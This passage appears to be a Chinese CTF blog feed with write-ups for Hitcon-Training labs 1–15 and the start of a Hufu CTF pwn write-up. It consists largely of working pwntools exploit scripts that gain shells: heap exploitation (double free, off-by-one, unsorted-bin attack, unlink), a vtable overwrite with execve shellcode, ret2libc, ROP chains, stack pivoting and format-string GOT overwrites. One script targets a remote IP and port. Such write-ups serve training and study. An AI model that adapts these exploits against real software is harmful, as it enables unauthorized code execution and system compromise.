hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(l,name,c): ru(": ") sl("1") ru(":") sl(str(l)) ru(":") sd(name) ru(":") sl(c)def visit(): ru(": ") sl("2")def remove(id): ru(": ") sl("3") ru(":") sl(str(id))def clean(): ru(": ") sl("4")flowerlist = 0x6020E0add(0x80,'a','ac')#0add(0x20,'b','bc')#1remove(0)clean()add(0x80,'\n','cc')#2visit()ru("[0] :")one = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = u64(rc(6).ljust(8,'\x00')) - 0x0a + 0x78 - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']onegadget = libc_base + one[1]fack_chunk = malloc_hook - 0x23log.info("main_arena --&gt; %s",hex(main_arena))log.info("malloc_hook --&gt; %s",hex(malloc_hook))log.info("libc_base --&gt; %s",hex(libc_base))log.info("onegadget --&gt; %s",hex(onegadget))log.info("fack_chunk --&gt; %s",hex(fack_chunk))add(0x60,'3','3c')#2add(0x60,'4','4c')#3remove(2)remove(3)remove(2)pay = p64(fack_chunk)*2add(0x60,pay,'4c')#4add(0x60,'5','5c')#5add(0x60,'6','6c')#6pay = 0x13*'a' + p64(onegadget)add(0x60,pay,'7c')#7ru(": ")sl("1")# gdb.attach(p)p.interactive() lab13常规堆题，增、删、查、改以及一个全局数组heaparray edit 函数中存在off-by-one 利用思路：首先申请chunk0，chunk1，edit chunk0修改chunk1的size ，然后free掉chunk1 再申请一个新的chunk1，使得chunk1落在指向chunk1的堆块上，从而能够修改chunk1的内容指针 修改chunk1内容指针为got表泄漏出真实地址 改free的got表为system地址，然后使得chunk0内容为’/bin/sh\x00’，free(0) getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./heapcreator') elf = ELF('./heapcreator') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sd(data)def edit(id,data): ru(":") sl('2') ru(":") sl(str(id)) ru(": ") sl(data)def show(id): ru(":") sl('3') ru(":") sl(str(id))def delete(id): ru(":") sl('4') ru(":") sl(str(id))heaparray = 0x6020A0create(0x18,'a')#0create(0x18,'b')#1edit(0,'/bin/sh\x00' + 0x10*'a' + '\x41')delete(1)create(0x30,p64(0)*4 + p64(0x30) + p64(elf.got['free']))show(1)ru("Content : ")free_addr = u64(ru('\n').strip('\n').ljust(8,'\x00'))libc_base = free_addr - libc.symbols['free']system = libc_base + libc.symbols['system']log.info("free_addr --&gt; %s",hex(free_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))edit(1,p64(system))delete(0)# gdb.attach(p)p.interactive() lab 14edit函数没有对size检测存在任意长度堆溢出，且程序存在cat flag的后门 做法1unsortedbin attack :利用堆溢出修改在unsortedbin列表尾部的bk为0x6020C0重新申请即可将0x6020C0修改成main_arena（unsortedbin 为FIFO）从而利用后门 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./magicheap') # elf = ELF('./magicheap') # libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sl(data)def edit(id,size,data): ru(":") sl('2') ru(":") sl(str(id)) ru(": ") sl(str(size)) ru(": ") sl(data)def delete(id): ru(":") sl('3') ru(":") sl(str(id))heaparray = 0x6020E0magic = 0x6020C0create(0x10,'a')#0create(0x80,'b')#1create(0x10,'c')#2delete(1)pay = 0x10*'a' + p64(0) + p64(0x91) + p64(magic - 0x10)*2edit(0,0x30,pay)create(0x80,'d')ru(":")sl('4869')# gdb.attach(p)p.interactive() 做法2unlink 修改free@got为system，再free掉一块内容为’/bin/sh\x00’的堆块getshell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./magicheap') elf = ELF('./magicheap') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sl(data)def edit(id,size,data): ru(":") sl("2") ru(":") sl(str(id)) ru(": ") sl(str(size)) ru(": ") sl(data)def delete(id): ru(":") sl('3') ru(":") sl(str(id))heaparray = 0x6020E0create(0x20,'a')#0create(0x80,'b')#1create(0x20,'/bin/sh\x00')#2create(0x20,'/bin/sh\x00')#3fd = heaparray - 0x18bk = heaparray - 0x10pay = p64(0) + p64(0x21)pay += p64(fd) + p64(bk)pay += p64(0x20) + p64(0x90)edit(0,0x30,pay)pay = p64(0)*3pay += p64(elf.got['free'])pay += p64(elf.got['puts'])delete(1)edit(0,0x30,pay)edit(0,8,p64(elf.plt['puts']))delete(1)ru('Index :')puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']system = libc_base + libc.symbols['system']log.info("puts_addr --&gt; %s",hex(puts_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))edit(0,8,p64(system))delete(3)# gdb.attach(p)p.interactive() lab15这是一道C++pwn，涉及到一个C++的虚表的问题，在c++的类中的虚表会通过一个叫虚表的东西进行跳转从而执行函数，关于虚表的知识点可以参考这位大佬：http://showlinkroom.me 一片红，NX都没开，还有RWX段，显然可以写shellcode，解题的思路在于，修改虚表，跳转到shellcode的位置执行。 虚表大概可以理解为：一个视情况指向相对应函数地址的指针（很显然这说法是错的） 虚表大概是这样子： 而且我们要让它变成这样： 结合IDA我们能看到，新申请的类是放在animallist数组中的，也就是说animallist存着指向虚表的指针 先申请两个dog，我们可以看到，animallist上存放着指针指向一个指向Dog::speak函数的指针（也就是虚表） 结构清楚了，再来看程序，这里没有限制长度，可以造成堆溢出而且长度不限，所以我们只需要通过溢出将指向shellcode地址的指针写到0xf4ac20上就行了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./zoo') # elf = ELF('./zoo') # libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def adddog(name,weight): ru(":") sl('1') ru(": ") sl(name) ru(": ") sl(str(weight))def addcat(name,weight): ru(":") sl('2') ru(": ") sl(name) ru(": ") sl(str(weight))def showanimal(id): ru(":") sl('4') ru(": ") sl(str(id))def remove(id): ru(":") sl('5') ru(": ") sl(str(id))def listen(id): ru(":") sl('3') ru(": ") sl(str(id))animallist = 0x605490edata = 0x605120nameofzoo = 0x605420ru(":")shellcode = shellcode_x64 = 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'sl(shellcode + p64(nameofzoo))adddog('dog1',0)adddog('dog2',1)# gdb.attach(p)remove(0)pay = 0x48*'a' + p64(nameofzoo + len(shellcode))adddog(pay,1)listen(0)# gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab1~lab9]]></title>
    <url>%2F2020%2F06%2F21%2FHitcon-Training(%E4%B8%8A)%2F</url>
    <content type="text"><![CDATA[lab1方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用123456key = "Do_you_know_why_my_teammate_Orange_is_so_angry???"cipher = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]flag = ""for i in range(len(cipher)): flag += chr(cipher[i]^ord(key[i]))print flag 方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：12345678910111213在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方► 0x80486e7 &lt;get_flag+332&gt; lea eax, [ebp - 0x80] 0x80486ea &lt;get_flag+335&gt; push eax 0x80486eb &lt;get_flag+336&gt; push dword ptr [ebp - 0x74] 0x80486ee &lt;get_flag+339&gt; call read@plt &lt;0x8048410&gt;再运行到0x8048712处，可以查看 ebp - 0x80的值 pwndbg&gt; x/wx ($ebp -0x80)0xffffcd08: 0x4f77e43c转成十进制，输入就能得到flagpwndbg&gt; cContinuing.1333257276 CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally] 方法3：同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可 lab2checksec 一波，只开了 canary 到IDA里看一波，程序逻辑很简单，就是让你输入一个shellcode然后执行它，但是这里需要注意orw_seccomp函数，里面有个prctl会限制部分syscall的调用，只能通过open ,read , write 到获得flag，不是很懂prctl的第一个参数的数值代表什么，就估且当做是第n个的代号吧,往下数到第22个 既然只能读写，那就不能用system(/bin/cat flag)去获取flag，这里我们需要自己写shellcode：123fp = open("flag",0)read(fp,buf,0x30)write(1,buf,0x30) 首先我们要查到open,read,write三个函数对应的系统调用号和参数应该调入的寄存器：linux syscall 接下来写shellcode：123456789101112131415161718192021fp = open(&quot;flag&quot;,0)push 0 0截断：这个0是必需的，这样才能截断字符串的读取push 0x67616c66 &quot;flag&quot;mov ebx,esp open的第一个参数 &quot;flag&quot;xor ecx,ecx 将ecx清0，做为open的第二个参数mov eax,0x5 open的系统调用号int 0x80 中断，进入系统调用read(fp,buf,0x30) mov ebx,eax 系统调用结束 ，将返回值存入eax，（open的返回值为fp,而fp为read的第一个参数）将ebx赋值为fp，做为read的第一个参数mov ecx,esp 将栈顶传给ecx做为read的第二个参数mov edx,0x30 read的第三个参数0x30xor eax,eax 清空eaxmov eax,0x3 read的系统调用号int 0x80 中断，进入系统调用write(1,buf,0x30)（因为write的第二个参数跟read的一样，所以这里可以不用再传一次）mov ebx,1 write的第1个参数mov edx,0x30 write的第三个参数mov eax,0x4 write的系统调用号int 0x80 中断，进入系统 调用 因为自己踩过坑，这里补充一下0截断，也就是在push “flag”之前 为什么要push 0：字符串在读取的时候总是以\x00作为结束标志，如果不先push 0，那么它会将后面的东西也当做字符串读取进来，这样会导致系统读到的文件名不是”flag”，而是”flag…..”后面还有东西，这样就会找不到flag，这里read的返回值就为-1。 这样，shellcode就写完了，exp如下 ：12345678910111213141516171819202122232425262728293031from pwn import *p = process('./orw.bin')shellcode = '''push 0push 0x67616c66mov ebx,espxor ecx,ecxmov eax,0x5int 0x80mov ebx,eaxmov ecx,espmov edx,0x30xor eax,eaxmov eax,0x3int 0x80mov ebx,1mov edx,0x30mov eax,0x4int 0x80'''print asm(shellcode)pause()p.recvuntil(":")gdb.attach(p,"b *0x08048582")pause()p.sendline(asm(shellcode))pause()p.interactive() lab3这一题很简单，第一次输入写进了bss段，第二次输入用gets函数，所以我们只需要在第一次输入的时候输入shellcode，第二次输入将返回地址覆盖成bss段的地址就行，需要注意的是,s的偏移并不是0x14，而是0x1c，如果 IDA 看不出来可以在gdb下信断点查看 exp:1234567891011from pwn import *p = process('./ret2sc')shellcode_addr = 0x0804A060shellcode = asm(shellcraft.sh())p.recvuntil(":")p.sendline(shellcode)p.recvuntil(":")payload = "A" * 0x1c + p32(0) + p32(shellcode_addr)p.sendline(payload)p.interactive() lab4两次输入，第一次输入一个地址，然后程序打印出地址的内容，这可以想到将puts_got地址输入就可以拿到puts函数的真实，先checksec一波 一道简单的ret2libc，那么接下来思路很简单，第一次输入给puts_got地址，拿到puts函数的真实地址，再得到puts函数的libc地址就可以算出偏移，之后 就可以为所欲为的得到其它函数的真实地址了；先找一下库文件： 接下来解决两个小问题：1、查找 字符串”\bin\sh”2、爆出第二次输入的偏移字符串的查找可以用pwntoolsbinsh_libc = libc.search(&#39;/bin/sh&#39;).next()偏移的获得用cyclic 参数生成一串字符之后 ，在gdb中输入得到一个地址，再用cyclic -l 地址即可得到到ret的偏移： exp:1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./ret2lib')elf = ELF('./ret2lib')libc = ELF('/lib/i386-linux-gnu/libc.so.6')puts_got = elf.got['puts']print str(puts_got) #134520860pause()p.sendline(str(puts_got))p.recvuntil(": ")puts_addr = int(p.recv(10),16)print "puts_addr:" + hex(puts_addr)puts_libc = libc.symbols['puts']print "puts_libc:" + hex(puts_libc)system_libc = libc.symbols['system']print "system_libc:" + hex(system_libc)binsh_libc = libc.search('/bin/sh').next() 查找 "/bin/sh" 的地址print "binsh_libc:" + hex(binsh_libc)offset = puts_addr - puts_libc #偏移system_addr = offset + system_libcbinsh_addr = offset + binsh_libc# main = 0x804857Dret= 0xdeadbeef #返回地址随意payload = "A" * 60payload += p32(system_addr) + p32(ret) + p32(binsh_addr)# payload += p32(system_addr) + 'b' * 4 + p32(binsh_addr)# gdb.attach(p,"b *0x0804862F")# pause()p.sendline(payload)p.interactive() lab5先checksec 一波 开启了NX保护，静态链接，溢出的空间也够构造rop链，一看就是return to syscall，但是没有发现system函数，也没有”/bin/sh”，这就需要我们自己写execve(“/bin/sh”)了我的思路是这样：将”/bin/sh”构造在bss段作为execve的参数，然后进入系统调用execve；那么我们先要找到一个可以写到内存的gadget：0x0807b301 : mov dword ptr [eax], edx ; ret,bss段的写入就跟之前的没什么两样，找到gadget：1230x080bae06 : pop eax ; ret0x0806e82a : pop edx ; ret0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret 这里还需要找到 int 0x80 : int 0x80```系统中断调用123456789101112131415161718192021222324252627282930313233343536这里还需要查一下sys_execve函数的系统调用号和参数对应的寄存器：![image.png](\images\hitcon-training\13.png)接下来就开始构造rop了：exp:```python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./simplerop&apos;)elf = ELF(&apos;./simplerop&apos;)bss = 0x080EAF80binsh = &quot;/bin/sh\x00&quot;mov_ineax = 0x0807b301# mov_eax_ecx = 0x080a7a6apop_edx_ecx_ebx = 0x0806e850pop_eax = 0x080bae06pop_ebx = 0x080481c9pop_edx = 0x0806e82aint0x80 = 0x080493e1payload = &quot;A&quot; * 32 #将&quot;/bin/sh\x00&quot;分两次写入bss段payload += p32(pop_eax) + p32(bss)payload += p32(pop_edx) + binsh[0:4]payload += p32(mov_ineax)payload += p32(pop_eax) + p32(bss + 4)payload += p32(pop_edx) + binsh[4:8]payload += p32(mov_ineax)#构造 execve(&quot;/bin/sh\x00&quot;)函数并调用 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)payload += p32(pop_eax) + p32(0x0b)#中断 ，进入系统调用 payload += p32(int0x80)p.sendline(payload)p.interactive() lab6从IDA我们可以看到，main函数只能调一次，那么就用不了ret2libc了，接下来算出溢出的空间只有20个字节（这里96是被我改过的，原题大小是0x40) checksec： 溢出的空间是不够用来构造rop链的，那么就要用到栈迁移了，思路是：先利用溢出执行一次read函数，把我们接下来要执行的rop链写到bss段去，利用leave将ebp跳转到bss段上去，让程序 当成栈去执行，从而达到栈迁移的目的找到对应的gadget就可以开始写exp了exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./migration')elf = ELF('./migration')# libc = ELF('/lib/i386-linux-gnu/libc.so.6')libc = elf.libcsystem_libc = libc.symbols['system']print "system_libc :" + hex(system_libc)puts_plt = elf.plt['puts']print "puts_plt :" + hex(puts_plt)puts_got = elf.got['puts']print "puts_got :" + hex(puts_got)puts_libc = libc.symbols['puts']print "puts_libc :" + hex(puts_libc)read_plt = elf.plt['read']print "read_plt :" + hex(read_plt)binsh = libc.search("/bin/sh").next()print "binsh :" + hex(binsh)leave_ret = 0x08048418buf1 = elf.bss() + 0x500buf2 = elf.bss() + 0x400# pop_ebp = 0x0804856bpop_ebx = 0x0804836d#调用 read 函数往 buf1 写入"/bin/sh"（不明白的一点，为什么第一个参数是0,第一个参数不该是指向"/bin/sh"的一个指针吗？）#read的第一个参数为0指的是标准输入流也就是键盘，在脚本里面的键盘就是payload,也就是下一个senndline(payload)就是读入的内容 payload = "A" * 40payload += p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)p.recvuntil(" :\n")# gdb.attach(p)pause()p.send(payload)# pause()#打印出puts的真实地址 ，然后继续调用 read 函数payload = p32(buf2) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)p.send(payload)# pause()#接收打印的puts真实地址 puts_addr = u32(p.recv(4))print "puts_addr :" + hex(puts_addr)#算偏移offset = puts_addr - puts_libcsystem_addr = offset + system_libcbinsh_addr = offset + binshpayload = p32(0) + p32(system_addr) + "bbbb" + p32(binsh_addr)p.send(payload)p.interactive()# 0xf7df9ca0 这里盗来23R3F师傅的一张图来理解栈迁移的过程 lab7先checksec一波，canary开了，不能愉快地栈溢出了 这道题的意思很清楚，password是一个随机数，只要在第二次输入的时候相等那就可以cat 到 flag ，那么我们需要在第二次输入之前就知道password的值，这里我自然而然地想到了用gdb下断查看 password 的值，这种做法虽然在本地可以但是一但远程了就没鸟用；这就用到了格式化字符串首先，我们要泄漏出password的值 ，要先得到格式化字符串的地址在哪，输入一串东西&quot;“AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p........ %p泄漏出了printf栈里面的东西，找到AAAA的位置，在第十个，也就是说，格式化字符串的栈的第十个位置，接下来我们就可以构造 [地址] + %10$s将password 泄漏出来，然后接下来就简单了。exp:12345678910111213141516171819202122#-*- coding:utf-8 -*-from pwn import *p = process('./crack')#输入"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...."可以爆出格化字符串的偏移为10password = 0x804A048# print p32(password)# pause()payload = p32(password) + "#" + "%10$s" + "#" #输入两个#用作标记p.recvuntil("What your name ? ")p.send(payload)p.recvuntil("#") #当接收到第一个#时开始返回password的内容了，接收r = p.recvuntil("#") #接收到 # 结束# print rprint len(r)pause()print u32(r[:4]) #因为第二个#会被接收，所以要去掉a = u32(r[:4])# print str(a)# pause()p.recvuntil("Your password :")p.send(str(a))p.interactive() lab8拿到题目，先checksec一波 开了canary，跟栈溢出没关系了，放到IDA里很明显可以看到我们只需要修改magic的值为218或者0xFACEB00C就行了，再看这一句printf(&amp;buf);很明显是格式化字符串了。先测试格式化字符串的位置： 偏移为7，接下来修改magic为2181234567891011121314#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')#改小magic = 0x0804A038payload = ""payload += p32(magic) + "%0214c" + "%7$n" #218-4 = 214，前面有个地址4位，所以只需再填214个字符payload2 = fmtstr_payload(7,&#123;magic:218&#125;)p.sendline(payload)p.recv()p.interactive() 修改magic为0xFACEB00C12345678910111213141516171819202122232425262728#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')magic = 0x0804A038padding1 = 0x10c-16 #因为0c-16&lt;0所以要在前面加一位(这个加了一位1),这样才能将0c读进去padding2 = 0x1b0 - 0x10cpadding3 = 0x1ce - 0x1b0padding4 = 0x1fa - 0x1ceprint padding1print padding2print padding3print padding4pause()payload = ""payload += p32(magic) + p32(magic+1) + p32(magic+2) + p32(magic+3)# payload += padding1*'a' + "%7$n" + padding2*'b' + "%8$n" + padding3*'c' + "%9$n" + padding4*'d' + "%10$n"payload += "%252c%7$hhn" #padding1 252+16 = 10c(以下同理)payload += "%164c%8$hhn" #padding2payload += "%30c%9$hhn" #padding3payload += "%44c%10$hhn" #padding4# payload2 = fmtstr_payload(7,&#123;magic:0xFACEB00C&#125;) #也可以直接调用fmtstr_payload这个函数p.sendline(payload2)# p.sendline(payload)p.recv()p.interactive() 搜索大佬的博客发现还有另外 两种做法：1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址，这样到执行puts(&quot;You need be a phd&quot;);时就会直接执行system(&quot;cat /home/craxme/flag&quot;);2、修改puts的got表为read(0, &amp;buf, 0x100u);把printf 的got表改为system的plt表地址，这样就能拿到shell了（我只能说骚啊）1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址 12345678910111213#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']system_catflag = 0x80485F3#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:system_catflag&#125;)p.sendline(payload)p.interactive() 2、get shell123456789101112131415#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']printf_got = elf.got['printf']system_plt = elf.plt['system']#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:read,printf_got:system_plt&#125;)p.sendline(payload)p.sendline('/bin/sh\x00') #这一句可加可不加我也不清楚 为什么 p.interactive() lab9格式化字符串漏洞，不过是有点蛇皮的格式化字符串，学到了不少新姿势 很明显的格式化字符串，但同时也可以发现，我们的输入是写到bss段去的，那就有一个问题了，我们要怎么利用格式化字符串修改got表为system函数的地址，因为这里我们要解决怎么把某个函数的got值放到栈里面去先看一下栈中的情况 可以发现输入放在bss段且固定在esp，但是也发现了几个有用的地址ebp1,fmt7,ebp2,fmt11，他们的格式化字符的偏移分别为6，7，10，11，我们还发现了libc_start_main+247这个真实地址，先泄漏出这个真实地址就可以得到偏移，进而算出其它函数的地址1234506:0018│ ebp 0xffffcd48 —▸ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x007:001c│ 0xffffcd4c —▸ 0x8048584 (play+59) ◂— nop 、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、0a:0028│ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x00b:002c│ 0xffffcd5c —▸ 0x80485b1 (main+42) ◂— nop 我们可以看到ebp1是指向ebp2的指针，ebp2指向一个不知名的地址，这样我们就可以得到栈的地址，因此，如果我们使用%n对ebp1进行操作，那么实际上会修改ebp2的内容，所以，如果我们将ebp2修改为指向fmt7，那么就可以对ebp2进行%n操作来修改fmt7的内容，试想，把fmt7的内容修改为printf_got，这样就实现了把got值放到栈里面去了，接下来就可能通过偏移来进行修改，但是又有另一个问题，一次只能修改2个字节，而需要修改的有4 个字节，又因为我们本来就是利用 printf 函数实现修改的，所以只能一次性修改4个字节（如果修改的不是printf函数，因为有个while循环，可以回到再利用printf函数进行第二次修改）。所以我们可以把要修改的高2 个字节放到fmt11去，同时修改两个位置，这样就可以了，那么思路就出来了。1234561、先泄漏出libc_start_main的地址，算出偏移2、利用偏移得到system等函数的地址3、泄漏出栈地址4、利用ebp1指向ebp2的关系修改ebp2指向fmt7，进而修改fmt7为printf_got，修改ebp2指向fmt11，进而修改fmt11为printf_got+25、修改fmt7和fmt11内容为system的地址6、发送&apos;/bin/sh&apos;做为system 的参数执行那可 exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#-*-coding:utf-8-*-#libc_start_main+247在偏移15处from pwn import *context.log_level = 'debug'p = process('./playfmt')# /lib/i386-linux-gnu/libc-2.23.soelf = ELF('./playfmt')libc = elf.libc p.recv()#泄漏 libc_start_main 的地址 p.sendline('%15$p')libc_start_main = int(p.recv(),16)-247print 'libc_start_main--&gt;' + hex(libc_start_main)# libc_start_main 的libc地址 libc_start_main_libc = libc.symbols['__libc_start_main']print 'libc_start_main_libc--&gt;' + hex(libc_start_main_libc)offset = libc_start_main - libc_start_main_libcprint 'offset--&gt;' + hex(offset)system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)printf_addr = offset + libc.symbols['printf']print 'printf_addr--&gt;' + hex(printf_addr) printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)# one_gadget = 0x3ac5c + offset# print 'one_gadget--&gt;' + hex(one_gadget)# 修改 printf_got 为 system_addr# 泄漏 ebp p.sendline('%6$p')ebp2 = int(p.recv(),16) #10ebp1 = ebp2-0x10 #6fmt7 = ebp1+0x4fmt11 = ebp2+0x4print 'ebp1--&gt;' + hex(ebp1)print 'ebp2--&gt;' + hex(ebp2)print 'fmt7--&gt;' + hex(fmt7)print 'fmt11--&gt;' + hex(fmt11)pause()# 先将 ebp2 指向fmt7# gdb.attach(p,"b *0x0804853B")p.sendline('%'+str(fmt7&amp;0xffff)+'c%6$hn')p.recv()# 再将 fmt7 修改为print_gotp.sendline('%'+str(printf_got&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break# 现在要将 fmt11 修改为print_got+2# 先将 ebp2 指向fmt11p.sendline('%'+str(fmt11&amp;0xffff)+'c%6$hn')p.recv()#再将 fmt11 修改为printf_got+2(即printf_got的高4位现在在printf_got+2的低4位的位置)p.sendline('%'+str((printf_got+2)&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“n0va”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''# --------到这里fmt7放着printf_got(即printf_addr),fmt11放着printf_got+2(即printf_addr的高4位移到了低4位的位置)# 修改printf_got 为sytem_addr (要同时修改fmt7为print_addr的低4位，fmt11为printf_addr的高4位)# 修改printf_got 的低4位payload = '%'+str((system_addr&amp;0xffff)-12)+'c%7$hn' #在调试时发现，在'%...c'之前有3个'n0va'所以要-12才能保证正确定入# 修改printf_got 的高4位payload += '%'+str((system_addr&gt;&gt;16)-(system_addr&amp;0xffff))+'c%11$hn'gdb.attach(p,"b *0x0804853B")p.sendline(payload)p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: breakp.sendline('/bin/sh')p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[虎符ctf部分pwn题解]]></title>
    <url>%2F2020%2F06%2F21%2Fhfctf%2F</url>
    <content type="text"><![CDATA[countARM pwn，虽然本地运行不起来，但是也不需要，直接挂远程就行了， 先是200次循环计算出结果后，输入一串字符处有溢出，将变量覆盖为0x12235612调用后门 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *import syslocal = 0if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('')else: p = remote("39.97.210.182","40285")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda 